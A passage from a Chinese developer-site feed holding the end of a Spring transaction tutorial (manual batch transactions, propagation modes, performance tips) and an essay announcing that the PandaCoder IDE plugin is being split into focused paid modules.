        List&lt;Long&gt; success = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        List&lt;String&gt; failed = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        
        <span class="hljs-keyword">for</span> (Long orderId : orderIds) {
            <span class="hljs-comment">// 每个订单一个独立事务</span>
            <span class="hljs-type">DefaultTransactionDefinition</span> <span class="hljs-variable">def</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultTransactionDefinition</span>();
            <span class="hljs-type">TransactionStatus</span> <span class="hljs-variable">status</span> <span class="hljs-operator">=</span> transactionManager.getTransaction(def);
            
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// 发货逻辑</span>
                <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> orderMapper.selectById(orderId);
                order.setStatus(<span class="hljs-number">2</span>);  <span class="hljs-comment">// 已发货</span>
                orderMapper.updateById(order);
                reduceStock(order);
                
                <span class="hljs-comment">// 手动提交</span>
                transactionManager.commit(status);
                success.add(orderId);
                
            } <span class="hljs-keyword">catch</span> (Exception e) {
                <span class="hljs-comment">// 手动回滚</span>
                transactionManager.rollback(status);
                failed.add(<span class="hljs-string">"订单"</span> + orderId + <span class="hljs-string">"："</span> + e.getMessage());
            }
        }
        
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BatchResult</span>(success, failed);
    }
}
</code></pre>
<h4 data-id="heading-26">高级用法：设置事务属性</h4>
<p>对于定时任务、后台批处理这种场景，可以显式控制事务属性：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> BatchResult <span class="hljs-title function_">batchCloseOrder</span><span class="hljs-params">(List&lt;Long&gt; orderIds)</span> {
    
    <span class="hljs-keyword">for</span> (Long orderId : orderIds) {
        <span class="hljs-type">DefaultTransactionDefinition</span> <span class="hljs-variable">def</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultTransactionDefinition</span>();
        
        <span class="hljs-comment">// 强制新事务（无论外层是否有事务）</span>
        def.setPropagationBehavior(TransactionDefinition.PROPAGATION_REQUIRES_NEW);
        
        <span class="hljs-comment">// 降低隔离级别，减少锁争用</span>
        def.setIsolationLevel(TransactionDefinition.ISOLATION_READ_COMMITTED);
        
        <span class="hljs-comment">// 设置超时，避免长事务阻塞</span>
        def.setTimeout(<span class="hljs-number">10</span>);
        
        <span class="hljs-type">TransactionStatus</span> <span class="hljs-variable">status</span> <span class="hljs-operator">=</span> transactionManager.getTransaction(def);
        
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> orderMapper.selectById(orderId);
            order.setStatus(<span class="hljs-number">4</span>);  <span class="hljs-comment">// 已关闭</span>
            orderMapper.updateById(order);
            
            transactionManager.commit(status);
            
        } <span class="hljs-keyword">catch</span> (Exception e) {
            transactionManager.rollback(status);
        }
    }
}
</code></pre>
<h4 data-id="heading-27">三种方式对比</h4>





























<table><thead><tr><th>方式</th><th>事务范围</th><th>一条失败影响</th><th>适用场景</th></tr></thead><tbody><tr><td>@Transactional</td><td>整个批次</td><td>全部回滚</td><td>不适合批量</td></tr><tr><td>手动事务（默认属性）</td><td>每条独立</td><td>只回滚这条</td><td>普通批处理</td></tr><tr><td>手动事务（定制属性）</td><td>每条独立</td><td>只回滚这条</td><td>高并发批处理</td></tr></tbody></table>
<p>我测试了100个订单，97个成功，3个失败。成功的都发货了，失败的记录下来了。</p>
<p><strong>核心价值</strong>：每条数据独立事务，部分失败不影响其他。</p>
<h3 data-id="heading-28">事务传播机制：3种常用场景</h3>
<p>创建订单时，要调另一个方法插入订单商品。两个方法都有<code>@Transactional</code>，会咋样？</p>
<p><strong>7种传播机制</strong>，常用的是3种：REQUIRED、REQUIRES_NEW、NESTED。</p>
<h4 data-id="heading-29">REQUIRED（默认）：同成同败</h4>
<p><strong>行为</strong>：有事务就加入，没有就新建。父子方法共享同一个事务。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 父方法</span>
<span class="hljs-meta">@Transactional(propagation = Propagation.REQUIRED)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">()</span> {
    orderMapper.insert(order);
    
    createOrderItems(order.getId());  <span class="hljs-comment">// 加入当前事务</span>
}

<span class="hljs-comment">// 子方法</span>
<span class="hljs-meta">@Transactional(propagation = Propagation.REQUIRED)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrderItems</span><span class="hljs-params">(Long orderId)</span> {
    itemMapper.batchInsert(items);
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ul>
<li>父子方法在同一个事务里</li>
<li>子方法抛异常 → 整个事务回滚（父也一起回滚）</li>
<li>订单和订单商品"同成同败"</li>
</ul>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[createOrder开启事务] --&gt; B[insert order]
    B --&gt; C[createOrderItems加入事务]
    C --&gt; D[insert items]
    D --&gt; E{子方法异常?}
    E --&gt;|是| F[整个事务回滚]
    E --&gt;|否| G[事务提交]
</code></pre>
<p><strong>适用场景</strong>：一个业务流程内的多步骤需要"同成同败"。80%的场景都用这个。</p>
<h4 data-id="heading-30">REQUIRES_NEW：独立事务</h4>
<p><strong>行为</strong>：挂起当前事务，开启一个全新的事务，独立提交/回滚。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 父方法</span>
<span class="hljs-meta">@Transactional</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">()</span> {
    orderMapper.insert(order);
    
    logService.saveLog(log);  <span class="hljs-comment">// 新事务，独立提交</span>
    
    <span class="hljs-comment">// 后面的代码可能失败</span>
}

<span class="hljs-comment">// 子方法</span>
<span class="hljs-meta">@Transactional(propagation = Propagation.REQUIRES_NEW)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">saveLog</span><span class="hljs-params">(Log log)</span> {
    logMapper.insert(log);
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ul>
<li>子方法失败只影响子事务，父事务不受影响</li>
<li>父事务后续回滚，子事务已提交的结果也保留</li>
<li>日志一定会保存，即使订单创建失败</li>
</ul>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[createOrder事务1] --&gt; B[insert order]
    B --&gt; C[挂起事务1]
    C --&gt; D[saveLog开启事务2]
    D --&gt; E[insert log]
    E --&gt; F[事务2提交-日志已保存]
    F --&gt; G[恢复事务1]
    G --&gt; H{事务1继续执行}
    H --&gt;|成功| I[事务1提交]
    H --&gt;|失败| J[事务1回滚-但日志保留]
</code></pre>
<p><strong>适用场景</strong>：必须独立持久化的动作，如：</p>
<ul>
<li>记录审计日志</li>
<li>写消息表</li>
<li>发送通知记录</li>
</ul>
<p>即使主流程失败也不能丢。</p>
<h4 data-id="heading-31">NESTED：局部回滚</h4>
<p><strong>行为</strong>：在同一物理事务内使用"保存点"（Savepoint），子方法相当于子事务。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 父方法</span>
<span class="hljs-meta">@Transactional</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">()</span> {
    orderMapper.insert(order);
    
    <span class="hljs-keyword">try</span> {
        createGift(order.getId());  <span class="hljs-comment">// 嵌套事务</span>
    } <span class="hljs-keyword">catch</span> (Exception e) {
        <span class="hljs-comment">// 赠品创建失败，但订单继续</span>
        log.warn(<span class="hljs-string">"赠品创建失败，继续处理订单"</span>);
    }
    
    <span class="hljs-comment">// 订单正常提交</span>
}

<span class="hljs-comment">// 子方法</span>
<span class="hljs-meta">@Transactional(propagation = Propagation.NESTED)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createGift</span><span class="hljs-params">(Long orderId)</span> {
    giftMapper.insert(gift);
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ul>
<li>子方法回滚只回滚到保存点，不影响父方法已做的操作</li>
<li>父方法回滚会连同子方法一起回滚</li>
<li>需要数据库支持保存点（InnoDB支持）</li>
</ul>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[createOrder事务开启] --&gt; B[insert order]
    B --&gt; C[创建保存点]
    C --&gt; D[createGift嵌套事务]
    D --&gt; E{赠品创建}
    
    E --&gt;|失败| F[回滚到保存点]
    F --&gt; G[订单保留]
    G --&gt; H[事务提交]
    
    E --&gt;|成功| I[继续执行]
    I --&gt; H
</code></pre>
<p><strong>适用场景</strong>：主流程可继续，但某个子步骤允许"局部失败回滚"。</p>
<ul>
<li>批处理中某条失败不影响前面已写入的步骤</li>
<li>赠品、优惠券等可选功能</li>
</ul>
<p><strong>注意</strong>：</p>
<ul>
<li>需要使用<code>DataSourceTransactionManager</code>（JPA的不支持）</li>
<li>数据库必须支持保存点（InnoDB支持，MyISAM不支持）</li>
</ul>
<h4 data-id="heading-32">三种传播行为对比</h4>

































<table><thead><tr><th>传播行为</th><th>事务关系</th><th>子方法失败影响</th><th>父方法失败影响</th><th>典型场景</th></tr></thead><tbody><tr><td>REQUIRED</td><td>共享事务</td><td>整个事务回滚</td><td>整个事务回滚</td><td>订单+订单商品</td></tr><tr><td>REQUIRES_NEW</td><td>独立事务</td><td>只回滚子事务</td><td>子事务已提交</td><td>审计日志</td></tr><tr><td>NESTED</td><td>保存点</td><td>回滚到保存点</td><td>整个事务回滚</td><td>赠品、优惠券</td></tr></tbody></table>
<h4 data-id="heading-33">选型建议</h4>
<ul>
<li><strong>默认用REQUIRED</strong>：80%的场景都是"同成同败"</li>
<li><strong>需要独立落盘的用REQUIRES_NEW</strong>：审计日志、消息表</li>
<li><strong>需要局部回滚的用NESTED</strong>：可选功能、批处理</li>
</ul>
<p>我测试了一下，这3种传播行为都符合预期。</p>
<h3 data-id="heading-34">几个要注意的地方</h3>
<h4 data-id="heading-35">事务范围要小</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 不好的写法</span>
<span class="hljs-meta">@Transactional</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">process</span><span class="hljs-params">()</span> {
    List&lt;Data&gt; data = queryBigData();   <span class="hljs-comment">// 慢查询，不需要事务</span>
    <span class="hljs-type">Data</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> calculate(data);      <span class="hljs-comment">// 计算，不需要事务</span>
    mapper.save(result);                <span class="hljs-comment">// 真正需要事务</span>
}

<span class="hljs-comment">// 改成这样</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">process</span><span class="hljs-params">()</span> {
    List&lt;Data&gt; data = queryBigData();
    <span class="hljs-type">Data</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> calculate(data);
    saveInTransaction(result);
}

<span class="hljs-meta">@Transactional</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">saveInTransaction</span><span class="hljs-params">(Data data)</span> {
    mapper.save(data);
}
</code></pre>
<p>只把写操作放事务里。</p>
<h4 data-id="heading-36">批量插入要用batchInsert</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 慢</span>
<span class="hljs-meta">@Transactional</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">(List&lt;Item&gt; items)</span> {
    <span class="hljs-keyword">for</span> (Item item : items) {
        mapper.insert(item);  <span class="hljs-comment">// N次数据库访问</span>
    }
}

<span class="hljs-comment">// 快</span>
<span class="hljs-meta">@Transactional</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">(List&lt;Item&gt; items)</span> {
    mapper.batchInsert(items);  <span class="hljs-comment">// 1次数据库访问</span>
}
</code></pre>
<p>我之前不知道这个，踩过坑。1000条数据，循环插入要10秒，批量插入只要0.5秒。</p>
<h4 data-id="heading-37">长事务要设置超时</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Transactional(timeout = 30)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">longTask</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 防止锁表</span>
}
</code></pre>
<p>生产环境一定要加这个。</p>
<h3 data-id="heading-38">总结一下</h3>
<p>这6种玩法，每个都能解决实际问题：</p>
<ol>
<li><strong>编程式事务</strong> → 库存不足保留订单</li>
<li><strong>@Transactional参数</strong> → 隔离级别、超时、回滚规则</li>
<li><strong>事务同步器</strong> → 事务提交后发MQ</li>
<li><strong>事务事件监听</strong> → 解耦业务逻辑</li>
<li><strong>手动控制事务</strong> → 批量操作</li>
<li><strong>事务传播机制</strong> → 日志记录、赠品创建</li>
</ol>
<p>80%的场景，<code>@Transactional</code>就够了。遇到特殊情况，再用对应的高级用法。</p>
<p>别过度设计，够用就行。</p>
<h3 data-id="heading-39">代码在这里</h3>
<p>所有代码都是可以跑的，有完整测试用例。</p>
<p>数据库脚本在 doc/simple-transactional-init.sql，导入就能用。</p>
<hr/>
<p><strong>你们平时用Spring事务都遇到过什么坑？</strong></p>
<p><strong>或者有什么好的实践经验？</strong></p>
<p><strong>欢迎在评论区聊聊，我也想学习学习。</strong></p>
<p>特别是事务传播机制那块，我自己还没完全搞透。如果有大佬愿意指点一下，那就太好了。</p>
<hr/>
<p><strong>如果这篇文章对你有帮助，麻烦点个赞👍，让更多人看到。</strong></p>
<p>这篇文章从研究Mall源码到写demo，再到写文章、画图、测试，前后花了两天时间。</p>
<p>希望能帮你解决实际问题。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[PandaCoder 的解构与新生：为中文开发者造一束专注的光]]></title>    <link>https://juejin.cn/post/7575104251866775562</link>    <guid>https://juejin.cn/post/7575104251866775562</guid>    <pubDate>2025-11-23T05:38:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575104251866775562" data-draft-id="7575182522410926118" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="PandaCoder 的解构与新生：为中文开发者造一束专注的光"/> <meta itemprop="keywords" content="IntelliJ IDEA,后端,程序员"/> <meta itemprop="datePublished" content="2025-11-23T05:38:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="舒一笑不秃头"/> <meta itemprop="url" content="https://juejin.cn/user/4257747754552599"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            PandaCoder 的解构与新生：为中文开发者造一束专注的光
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4257747754552599/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    舒一笑不秃头
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T05:38:07.000Z" title="Sun Nov 23 2025 05:38:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>“我不是在做工具，我是在为开发者造光；真正的创造，有时始于勇敢的拆解。”</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4b58793b53eb4803b2cf9677750b19da~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IiS5LiA56yR5LiN56eD5aS0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481087&amp;x-signature=K7zAXMrm4fwJrV80JCnI1Ue3mW0%3D" alt="" loading="lazy"/></p>
<p>写下这两句话时，“深圳的雨”刚刚停歇，窗外的空气湿润而清冽，像极了我此刻的心情——平静中带着决断。</p>
<p>PandaCoder，这个以国宝熊猫为名、为中文开发者而生的小插件，已经悄然走过了一段喧嚣与静默交织的旅程。它最初的模样，是我对“高效编程”最朴素的想象：一个能理解中文思维、辅助英文编码、减轻上下文切换负担的智能伙伴。它免费、开源，像一叶轻舟，驶入万千开发者的 IDE 世界。</p>
<p>然而，舟行水上，亦有风浪。</p>
<p>随着用户反馈的积累，我不断为其添砖加瓦：支持 Jenkins Pipeline 的语法高亮、SpringBoot 配置文件的图标识别、AI 驱动的注释翻译、自动生成类名与变量名……功能越来越多，PandaCoder 逐渐从一把轻盈的瑞士军刀，变成一个塞满工具的百宝箱。表面看，它“更强大”了；实则，它开始迷失焦点。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9bcc42f13cdd475684758263c39a76bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IiS5LiA56yR5LiN56eD5aS0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481087&amp;x-signature=EVSxF6fyCbPHGD1ySuwnDqosnpc%3D" alt="" loading="lazy"/></p>
<p>更令人深思的是，在开源世界的开放与共享之外，我也遭遇了意料之外的寒流——一些恶意评论、无端指责，甚至对动机的揣测。这些噪音虽不至于击垮我，却悄然消耗着创造的热忱。我开始反复追问自己：一个开发者工具的终极价值，究竟是功能的多寡，还是它能否在某个深夜，让一位疲惫的程序员会心一笑？</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bfa769b0d1c34098a066aba89f64bcd7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IiS5LiA56yR5LiN56eD5aS0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481087&amp;x-signature=fSfJMP9ui03bvlwjxY%2BSx1R0PTI%3D" alt="" loading="lazy"/></p>
<p>纳瓦尔·拉维坎特曾说：“把自己产品化。”这句话曾被简化为一句创业口号，但我越来越体会到它的深意——它是一种承诺：将你独特的洞察、反复打磨的技艺，与对用户深沉的责任感，封装成一个可持续、可复制、能持续创造价值的产品。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/011046c2ef15463db675a8dcbf9c7800~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IiS5LiA56yR5LiN56eD5aS0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481087&amp;x-signature=FW60wavw%2B5w14zCalnxET5fHeas%3D" alt="" loading="lazy"/></p>
<p>于是，我做出一个艰难但坚定的决定：<strong>解构 PandaCoder，重启产品哲学</strong>。</p>
<p>未来的 PandaCoder，将不再是一个“大而全”的插件，而是拆解为一组<strong>专注、独立、可组合</strong>的微型产品。每一部分都将回归其最本真的价值：</p>
<ul>
<li><strong>中文命名助手</strong>：专注解决“中文想法如何优雅转化为英文标识符”的核心痛点。它不是翻译器，而是你的命名协作者，让类名、变量、方法名如诗般自然流淌。</li>
<li><strong>Jenkins Pipeline 增强模块</strong>：为 CI/CD 脚本开发者提供类 VS Code 的语法高亮、智能补全与错误提示，让 Groovy 脚本不再是一段“黑盒”。</li>
<li><strong>SpringBoot 配置可视化器</strong>：在 <code>application.yml</code> 旁自动渲染数据库、Redis、MQ 等组件图标，让配置结构一目了然，告别“猜配置”的时代。</li>
</ul>
<p>这些模块或将拥有新的名字，但它们共享同一个灵魂：<strong>少即是多，专注即力量</strong>。它们可以独立安装、按需启用，不再强迫用户为用不到的功能买单（无论是性能还是心理成本）。</p>
<p>伴随这次产品形态的重塑，PandaCoder 也将从完全免费开源，转向<strong>轻量付费模式</strong>。这绝非筑起高墙，而是希望建立一种更健康、更郑重的创造者与使用者关系。</p>
<p>付费，是价值的锚点。<br/>
它过滤掉噪音，吸引真正需要并珍视这份价值的同路人；<br/>
它也是我持续投入、深度打磨产品的基石。<br/>
在开源精神与可持续创造之间，我选择一条中间路径：核心逻辑透明、关键体验付费。未来，部分模块仍会保留开源版本，但完整体验将通过订阅支持长期迭代。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4512af03120945ebb380c952f36d44b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IiS5LiA56yR5LiN56eD5aS0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481087&amp;x-signature=FVR5ox%2BLVUllgEwhj3wiM4cs40I%3D" alt="" loading="lazy"/></p>
<p>我知道，这或许会让一些人遗憾。但我也相信，真正的用户，不会因为价格离开，而会因为价值留下。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e1bc0d29215e497fa523470cbe9584ea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IiS5LiA56yR5LiN56eD5aS0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481087&amp;x-signature=wx5JWvWPvWFszlYUvc1wugfd%2FbE%3D" alt="" loading="lazy"/></p>
<p>这条路或许孤独，但我始终信奉：“<strong>慢即是快</strong>”。在追逐风口与流量的时代，我愿做那个愿意蹲下来，反复打磨一把小刀的人。因为我知道，真正改变编程体验的，往往不是宏大的框架，而是那些在关键时刻“刚刚好”的微小工具。</p>
<p>PandaCoder 的重生，不是一次商业转型，而是一次产品初心的回归。<br/>
我不再追求“所有人都用”，而是渴望“对的人离不开”。</p>
<p>最后，我想对每一位曾使用、反馈、甚至批评过 PandaCoder 的你说一声：谢谢。正是你们的存在，让我不断反思、进化、前行。未来的路，或许不再喧嚣，但会更加坚定。</p>
<p>因为最终，我们共建的不是一个插件，而是一种更优雅、更从容、更属于中文开发者的编程生活方式。</p>
<p>众行者远。愿这束微光，能照亮我们共同的代码前路。山海自有归期，期待我们下一次更好的相遇~</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[使用 Vite + Vue 3 搭建项目并配置路由的全流程（含国内镜像加速）]]></title>    <link>https://juejin.cn/post/7575090551357128756</link>    <guid>https://juejin.cn/post/7575090551357128756</guid>    <pubDate>2025-11-22T16:08:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575090551357128756" data-draft-id="7574251313884020751" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="使用 Vite + Vue 3 搭建项目并配置路由的全流程（含国内镜像加速）"/> <meta itemprop="keywords" content="Vue.js,Node.js,Vite"/> <meta itemprop="datePublished" content="2025-11-22T16:08:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AAA阿giao"/> <meta itemprop="url" content="https://juejin.cn/user/473218785740627"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" 